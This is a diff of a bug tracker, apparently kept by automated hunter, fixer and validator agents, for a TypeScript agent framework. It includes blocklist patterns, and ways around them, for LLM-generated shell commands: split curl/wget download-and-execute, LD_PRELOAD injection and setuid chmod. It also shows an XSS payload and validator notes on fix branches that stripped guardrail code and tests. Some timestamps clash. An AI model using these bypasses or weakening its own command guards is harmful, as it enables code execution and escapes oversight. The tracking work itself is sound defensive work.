@@ -10,25 +10,25 @@
 | Key | Value |
 |---|---|
 | **Last CI Sentinel Pass** | `2026-03-20T20:50:00Z` |
-| **Last Hunter Scan** | `2026-03-20T22:24:00Z` |
-| **Last Fixer Pass** | `2026-03-20T21:01:00Z` |
-| **Last Validator Pass** | `2026-03-20T21:15:30Z` |
-| **Last Digest Run** | `2026-03-20T20:35:00Z` |
+| **Last Hunter Scan** | `2026-03-20T22:26:00Z` |
+| **Last Fixer Pass** | `2026-03-20T21:15:00Z` |
+| **Last Validator Pass** | `2026-03-20T21:45:30Z` |
+| **Last Digest Run** | `2026-03-20T23:00:00Z` |
 | **Last Security Scan** | `2026-03-20T20:10:48Z` |
 | **Hunter Loop Interval** | `5min` |
 | **Fixer Loop Interval** | `2min` |
 | **Validator Loop Interval** | `5min` |
-| **Last TestGen Run** | `2026-03-20T21:02:00Z` |
+| **Last TestGen Run** | `2026-03-20T21:22:00Z` |
 | **Last Git Manager Pass** | `2026-03-20T21:00:17Z` (Cycle 196) |
-| **Last Supervisor Pass** | `2026-03-20T21:00:31Z` |
-| **Total Found** | `348` |
-| **Total Pending** | `42` |
-| **Total In Progress** | `6` |
-| **Total Fixed** | `22` |
+| **Last Supervisor Pass** | `2026-03-20T21:20:30Z` |
+| **Total Found** | `353` |
+| **Total Pending** | `47` |
+| **Total In Progress** | `1` |
+| **Total Fixed** | `26` |
 | **Total In Validation** | `0` |
 | **Total Verified** | `0` |
 | **Total Blocked** | `1` |
-| **Total Reopened** | `8` |
+| **Total Reopened** | `0` |
 
 ---
 
@@ -388,7 +388,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0276
-- **status:** `in-progress`
+- **status:** `fixed`
 - **severity:** `high`
 - **file:** `src/pregel/execution.ts`
 - **line:** `160`
@@ -400,9 +400,9 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **description:** The circuit breaker fallback in `execution.ts` calls `fallback(state, err)` with two arguments, but `CircuitBreaker.execute()` in `circuit-breaker.ts:36` calls `this.config.fallback()` with zero arguments — the two invocation sites have incompatible signatures.
 - **context:** A user registering a fallback that expects `(state, error)` would have it work correctly when triggered from `execution.ts:160` but receive `undefined` for both parameters when triggered from the `CircuitBreaker` class directly. This makes the fallback contract unreliable depending on which code path triggers it.
 - **hunter_found:** `2026-03-19T23:05:00Z`
-- **fixer_started:** ``
-- **fixer_completed:** ``
-- **fix_summary:** ``
+- **fixer_started:** `2026-03-20T21:08:00Z`
+- **fixer_completed:** `2026-03-20T21:15:00Z`
+- **fix_summary:** `Changed CircuitBreakerConfig.fallback type to (state: unknown, error: Error) => unknown. Added state param to execute(). Both fallback call sites now pass (state, error). execution.ts passes real graph state via cb.execute(executeWithTimeout, state).`
 - **validator_started:** `2026-03-20T20:45:00Z`
 - **validator_completed:** `2026-03-20T20:45:00Z`
 - **validator_notes:** `REOPENED: CircuitBreaker.execute() was NOT given a state parameter. Signature remains execute<T>(fn). Both fallback call sites pass undefined hardcoded instead of real state. execution.ts line 152 still calls cb.execute(executeWithTimeout) with no state arg. Fallback type is (...args: unknown[]) not (state, error). Fix must add state param to execute(), update execution.ts to pass state, type fallback correctly.`
@@ -539,7 +539,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0289
-- **status:** `fixed`
+- **status:** `reopened`
 - **severity:** `medium`
 - **file:** `src/harness/hooks-engine.ts`
 - **line:** `347`
@@ -548,37 +548,15 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **test_file:** `src/__tests__/hooks-bash-bypass-extended.test.ts`
 - **description:** The `withSecurityGuardrails()` Bash blocklist pattern `/curl[^|]*\|\s*sh/` is bypassed by redirecting output to a file then executing it, and does not cover `LD_PRELOAD` injection or `chmod +s` setuid escalation.
 - **context:** The regex `/curl[^|]*\|\s*sh/` only blocks the direct pipe form `curl ... | sh`. Splitting into two commands (`curl url > /tmp/f && bash /tmp/f`) produces zero matches and passes all guards. Similarly `wget url -O /tmp/f && sh /tmp/f` bypasses the wget patterns. An LLM-generated Bash command using these split forms achieves identical remote code execution. Additionally, the blocklist has no pattern for `LD_PRELOAD=/tmp/evil.so command` (shared library injection) or `chmod u+s /bin/bash` (setuid escalation). Fix: add split-download-and-execute patterns (covering `> /tmp/` + shell invocation, `-O /tmp/` patterns), and add `LD_PRELOAD` and `chmod.*[+]s` entries to `dangerousBashPatterns`. OWASP A03:2021 - Injection.
-- **reopen_count:** `0`
+- **reopen_count:** `1`
 - **branch:** `bugfix/BUG-0289`
 - **hunter_found:** `2026-03-21T04:10:00Z`
 - **fixer_started:** ``
-- **fixer_completed:** `2026-03-20T08:11:25Z`
-- **fix_summary:** `Added 5 patterns to dangerousBashPatterns: chmod +s, curl split download+execute (-o then sh), wget split, redirect-to-file then sh, LD_PRELOAD injection. tsc clean.`
-- **validator_started:** ``
-- **validator_completed:** ``
-- **validator_notes:** ``
-
----
-
-### BUG-0292
-- **status:** `fixed`
-- **severity:** `medium`
-- **file:** `src/swarm/compile-ext.ts`
-- **line:** `36`
-- **category:** `security-injection`
-- **description:** `buildSwarmExtensions().toMermaid()` and `StateGraph.toMermaid()` embed node IDs directly into Mermaid markup without sanitization, enabling Mermaid injection via crafted agent or node names.
-- **context:** A prior fix (BUG-0290/BUG-0291) added `sanitizeMermaid()` in `src/inspect.ts` and applied it to `toMermaidDetailed()`. However, two sibling `toMermaid()` implementations were not updated: (1) `src/swarm/compile-ext.ts` line 36 embeds `from` and `edge.to` verbatim — these are agent IDs sourced from `SwarmAgentDef.id`, which is supplied at `spawnAgent()` call time; (2) `src/graph.ts` line 223 does the same for `edge.from` / `edge.to`. A crafted ID such as `"a\nstyle a fill:#ff0000\ninjected_directive"` would inject arbitrary Mermaid directives into the diagram output. Since Mermaid diagrams are rendered in web UIs, this can enable client-side script injection (XSS) in environments that render the Mermaid output. Fix: import and apply `sanitizeMermaid()` from `inspect.ts` to all node name interpolations in both affected files. OWASP A03:2021 - Injection.
-- **reopen_count:** `0`
-- **branch:** `bugfix/BUG-0292`
-- **hunter_found:** `2026-03-20T08:20:00Z`
-- **fixer_started:** `2026-03-20T09:06:39Z`
-- **fixer_completed:** `2026-03-20T09:06:39Z`
-- **fix_summary:** `Sanitized node IDs in toMermaid() to prevent Mermaid injection via crafted names.`
-- **validator_started:** ``
-- **validator_completed:** ``
-- **validator_notes:** ``
-- **test_generated:** `true`
-- **test_file:** `src/__tests__/mermaid-node-injection.test.ts`
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** `2026-03-20T21:45:00Z`
+- **validator_completed:** `2026-03-20T21:45:00Z`
+- **validator_notes:** `REOPENED: bugfix/BUG-0289 is same catastrophic 216-file rewrite branch (14604 lines deleted) as BUG-0296/0297/0298. 4th occurrence of this pattern in hooks-engine.ts bugs. Must rebuild from clean main with ONLY the 5 dangerousBashPatterns additions.`
 
 ---
 
@@ -603,7 +581,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0296
-- **status:** `in-progress`
+- **status:** `fixed`
 - **severity:** `high`
 - **file:** `src/harness/hooks-engine.ts`
 - **line:** `343`
@@ -613,9 +591,9 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **reopen_count:** `1`
 - **branch:** `bugfix/BUG-0296`
 - **hunter_found:** `2026-03-20T20:00:15Z`
-- **fixer_started:** ``
-- **fixer_completed:** ``
-- **fix_summary:** ``
+- **fixer_started:** `2026-03-20T21:08:00Z`
+- **fixer_completed:** `2026-03-20T21:15:00Z`
+- **fix_summary:** `Added 3 base64 bypass patterns to dangerousBashPatterns array ONLY. No other code changed. 1 file, additions only, 0 deletions. Patterns: /base64[^|]*\|\s*sh/, /base64[^|]*\|\s*bash/, /base64\s+.*-d.*\|/.`
 - **validator_started:** `2026-03-20T20:45:00Z`
 - **validator_completed:** `2026-03-20T20:45:00Z`
 - **validator_notes:** `REOPENED: Base64 patterns are correct but bugfix branch introduces critical regressions: (1) fail-closed security removed for PreToolUse hooks, (2) matches() reverted to checking only first string value (re-opens BUG-0028), (3) hasRmRf token scanner replaced with ReDoS-vulnerable regex, (4) eval bypass patterns removed (re-opens BUG-0008), (5) 75 test files deleted. Fix must add ONLY the 3 base64 patterns without reverting any existing code.`
@@ -623,7 +601,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0297
-- **status:** `in-progress`
+- **status:** `fixed`
 - **severity:** `high`
 - **file:** `src/harness/hooks-engine.ts`
 - **line:** `343`
@@ -633,9 +611,9 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **reopen_count:** `1`
 - **branch:** `bugfix/BUG-0297`
 - **hunter_found:** `2026-03-20T20:00:15Z`
-- **fixer_started:** ``
-- **fixer_completed:** ``
-- **fix_summary:** ``
+- **fixer_started:** `2026-03-20T21:08:00Z`
+- **fixer_completed:** `2026-03-20T21:15:00Z`
+- **fix_summary:** `Added 4 interpreter bypass patterns to dangerousBashPatterns array ONLY (same commit as BUG-0296). No other code changed. Patterns: /python[23]?\s+-c/, /perl\s+-e/, /ruby\s+-e/, /node\s+-e/.`
 - **validator_started:** `2026-03-20T21:05:00Z`
 - **validator_completed:** `2026-03-20T21:05:00Z`
 - **validator_notes:** `REOPENED: Same catastrophic branch as BUG-0296 — 215 files changed, 14277 lines deleted. Fail-closed security removed (hook crashes silently pass). BUG-0028 fix reverted (matches only first string value). hasRmRf token scanner replaced with ReDoS regex. 89 test files deleted. The 4 interpreter patterns are correct but buried in an unmergeable branch. Rebuild from main with ONLY the 4 pattern additions.`
@@ -742,26 +720,6 @@ pending → in-progress → fixed → in-validation → verified → archived to
 
 ---
 
-### BUG-0302
-- **status:** `fixed`
-- **severity:** `medium`
-- **file:** `src/swarm/mermaid.ts`
-- **line:** `45`
-- **category:** `security-xss`
-- **description:** `toSwarmMermaid()` embeds agent `role` and capability `name` values directly into HTML tags (`<b>${entry.role}</b>`, `<i>${caps}</i>`) without escaping `<`, `>`, `&`, or `'` characters, enabling HTML injection in rendered Mermaid diagrams.
-- **context:** Line 60 escapes `"`, `[`, and `]` but not HTML metacharacters. An agent definition with `role: "</b><img src=x onerror=alert(1)><b>"` injects arbitrary HTML into the Mermaid label. Since Mermaid diagrams are rendered in web UIs (VS Code previews, documentation sites, dashboards), this is a stored XSS vector — the malicious role persists in the agent registry and fires every time the diagram is displayed. Prior fixes (BUG-0290/0291/0292) addressed `sanitizeMermaid()` for node IDs in `inspect.ts` and `compile-ext.ts`, but `mermaid.ts` uses a different code path with inline HTML labels that was not covered. Fix: escape `<>&'"` in `entry.role` and `c.name` before embedding in HTML tags, or apply the existing `sanitizeMermaid()` pattern. OWASP A03:2021 - Injection / A07:2021 - XSS.
-- **reopen_count:** `0`
-- **branch:** `bugfix/BUG-0302`
-- **hunter_found:** `2026-03-20T20:04:36Z`
-- **fixer_started:** `2026-03-20T22:53:00Z`
-- **fixer_completed:** `2026-03-20T21:01:00Z`
-- **fix_summary:** `Added escapeHtml() helper that escapes & < > " ' to HTML entities; applied it to entry.role and c.name in toSwarmMermaid() before embedding in HTML <b> and <i> tags, preventing HTML/XSS injection via malicious agent role or capability names.`
-- **validator_started:** ``
-- **validator_completed:** ``
-- **validator_notes:** ``
-
----
-
 ### BUG-0303
 - **status:** `pending`
 - **severity:** `low`
@@ -843,7 +801,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0304
-- **status:** `in-progress`
+- **status:** `fixed`
 - **severity:** `high`
 - **file:** `src/guardrails/budget.ts`
 - **line:** `57`
@@ -853,9 +811,9 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **reopen_count:** `1`
 - **branch:** `bugfix/BUG-0304`
 - **hunter_found:** `2026-03-20T20:08:29Z`
-- **fixer_started:** ``
-- **fixer_completed:** ``
-- **fix_summary:** ``
+- **fixer_started:** `2026-03-20T21:08:00Z`
+- **fixer_completed:** `2026-03-20T21:15:00Z`
+- **fix_summary:** `Re-applied fix fresh from main. Added input sanitization at top of record() using Number.isFinite() and > 0 guards, clamping NaN/Infinity/negative to 0. All downstream accumulations use sanitized values.`
 - **validator_started:** `2026-03-20T21:05:00Z`
 - **validator_completed:** `2026-03-20T21:05:00Z`
 - **validator_notes:** `REOPENED: Fix not present on main. record() at lines 57-62 still accumulates raw usage.inputTokens/outputTokens with no Number.isFinite() check or >0 guard. NaN and negative values still poison accumulators. Branch bugfix/BUG-0304 was never merged. Re-merge or re-apply the fix.`
@@ -943,7 +901,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0314
-- **status:** `in-progress`
+- **status:** `fixed`
 - **severity:** `high`
 - **file:** `packages/tools/src/code-execution/e2b.ts`
 - **line:** `68`
@@ -953,52 +911,12 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **description:** When `timeoutPromise` wins `Promise.race`, the `codePromise` is left floating and `sandbox.close()` is called before it settles, causing an unhandled rejection from the orphaned code execution promise.
 - **context:** In sandbox timeout scenarios, the still-running code execution completes after the sandbox is closed, producing an unhandled promise rejection that can crash the process or pollute logs with misleading errors.
 - **hunter_found:** `2026-03-20T21:30:00Z`
-- **fixer_started:** ``
-- **fixer_completed:** ``
-- **fix_summary:** ``
+- **fixer_started:** `2026-03-20T21:08:00Z`
+- **fixer_completed:** `2026-03-20T21:15:00Z`
+- **fix_summary:** `codePromise declared outside try so catch can attach .catch(() => {}) to suppress orphaned rejection on timeout. clearTimeout(timerId) preserved in finally for timer leak prevention. Both validator requirements met.`
 - **validator_started:** `2026-03-20T20:55:00Z`
 - **validator_completed:** `2026-03-20T20:55:00Z`
 - **validator_notes:** `REOPENED: Branch fixes unhandled rejection via .catch(() => {}) in catch block, but lacks clearTimeout entirely. setTimeout timer ID is never stored, so the timer always leaks on the happy path (code finishes before timeout). Main already has clearTimeout in finally but lacks .catch(). Correct fix needs BOTH: codePromise.catch(() => {}) when timeout wins AND clearTimeout(timerId) in finally.`
-
----
-
-### BUG-0315
-- **status:** `fixed`
-- **severity:** `medium`
-- **file:** `src/swarm/tracer.ts`
-- **line:** `175`
-- **category:** `logic-bug`
-- **reopen_count:** `0`
-- **branch:** `bugfix/BUG-0315`
-- **description:** `startTimeStacks` uses `shift()` (FIFO) instead of `pop()` (LIFO) to match agent start times with complete/error events, computing incorrect latencies for interleaved concurrent runs of the same agent.
-- **context:** When multiple concurrent invocations of the same agent overlap, each complete event gets paired with the wrong start time, producing inaccurate latency metrics in the trace output.
-- **hunter_found:** `2026-03-20T21:30:00Z`
-- **fixer_started:** `2026-03-20T22:53:00Z`
-- **fixer_completed:** `2026-03-20T21:01:00Z`
-- **fix_summary:** `Changed stack.shift()! to stack.pop()! in both agent_complete and agent_error handlers in tracer.ts to use LIFO ordering when matching start times, fixing incorrect latency calculations for interleaved concurrent agent runs.`
-- **validator_started:** ``
-- **validator_completed:** ``
-- **validator_notes:** ``
-
----
-
-### BUG-0317
-- **status:** `fixed`
-- **severity:** `medium`
-- **file:** `packages/tools/src/slack/index.ts`
-- **line:** `78`
-- **category:** `missing-error-handling`
-- **reopen_count:** `0`
-- **branch:** `bugfix/BUG-0317`
-- **description:** `client.chat.postMessage()` is returned directly from `execute` with no try/catch, so Slack API errors (rate limits, invalid channel, revoked token) become unhandled rejections that crash the agent loop.
-- **context:** Every other tool in `packages/tools/src/` wraps API calls in try/catch or checks response status. The Slack tool is the only one where SDK exceptions escape the execute boundary without being converted into tool-result error messages.
-- **hunter_found:** `2026-03-20T21:30:00Z`
-- **fixer_started:** `2026-03-20T22:53:00Z`
-- **fixer_completed:** `2026-03-20T21:01:00Z`
-- **fix_summary:** `Wrapped all three Slack tool execute methods (slack_send_message, slack_post_to_channel, slack_reply_in_thread) in try/catch blocks. Slack API errors are now caught and returned as { error: "Slack API error: ..." } instead of escaping as unhandled rejections.`
-- **validator_started:** ``
-- **validator_completed:** ``
-- **validator_notes:** ``
 
 ---
 
@@ -1613,6 +1531,106 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **description:** A local `stripProtoKeys` function declared inside the `modifiedInput` block shadows the module-level `stripProtoKeys` — the two implementations have subtly different behavior for array handling, and the shadowing is almost certainly unintentional.
 - **context:** Maintenance changes to one copy will not propagate to the other, creating a divergence hazard. The outer function handles arrays differently than the inner one.
 - **hunter_found:** `2026-03-20T22:24:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0349
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/swarm/compile-ext.ts`
+- **line:** `68`
+- **category:** `race-condition`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `spawnAgent()` and `removeAgent()` mutate the live `runner.nodes` and `runner._edgesBySource` Maps while the Pregel execution loop may be concurrently iterating those same structures.
+- **context:** `streamSupersteps` iterates `ctx.nodes` and `ctx._edgesBySource` every superstep without any lock. A concurrent `spawnAgent` or `removeAgent` call during a live graph execution can add or delete entries mid-iteration, causing `NodeNotFoundError` or silently skipping a newly added agent.
+- **hunter_found:** `2026-03-20T22:26:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0350
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/swarm/self-improvement/skill-evolver.ts`
+- **line:** `86`
+- **category:** `race-condition`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `recordSkillUsage` calls `splice(0, ...)` on `this.usageHistory` while `identifyWeakSkills` or `proposeSkillImprovement` may be concurrently iterating the same array.
+- **context:** If `proposeSkillImprovement` (which filters `this.usageHistory`) is awaited concurrently with `recordSkillUsage` triggering splice-based eviction, the `filter` call can observe a truncated or shifted array, producing an incorrect failure list passed to the LLM.
+- **hunter_found:** `2026-03-20T22:26:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0351
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/pregel/streaming.ts`
+- **line:** `296`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** Subgraph streaming hard-codes `childStreamMode: ["debug", "values"]`, ignoring the parent's actual requested stream modes and never collecting `"custom"` or `"messages"` events.
+- **context:** If the parent only requested `"updates"`, the child still runs in `["debug", "values"]` mode, generating irrelevant events. More critically, `"custom"` and `"messages"` events emitted inside a subgraph are never surfaced because `modeCustom` and `modeMessages` checks on `allSubgraphEvents` always yield nothing.
+- **hunter_found:** `2026-03-20T22:26:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0352
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/swarm/factories.ts`
+- **line:** `743`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `buildDag` directly mutates private `(swarm.inner as any).edges = []` to rewire graph topology after `addAgent`, but does not clear other internal state (`conditionalEdges`, `pathMaps`) that `addAgent` may have registered.
+- **context:** Clearing only `edges` leaves dangling references in other internal structures that can cause `NodeNotFoundError` or silently skip nodes during execution. The same pattern at line 854 in `buildPool` has the same risk.
+- **hunter_found:** `2026-03-20T22:26:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0353
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/hitl/resume.ts`
+- **line:** `26`
+- **category:** `memory-leak`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `HITLSessionStore` uses lazy eviction with no background timer, allowing resumed sessions past their TTL to accumulate in the `sessions` Map indefinitely if no new operations trigger `evict()`.
+- **context:** The `evict()` method is only called from `record()`, `get()`, `getByThread()`, and `pendingCount()` — not from `all()` or `markResumed()`. In a long-lived process where sessions are created and marked resumed but no further HITL operations arrive, the map grows without bound.
+- **hunter_found:** `2026-03-20T22:26:00Z`
 - **fixer_started:** ``
 - **fixer_completed:** ``
 - **fix_summary:** ``
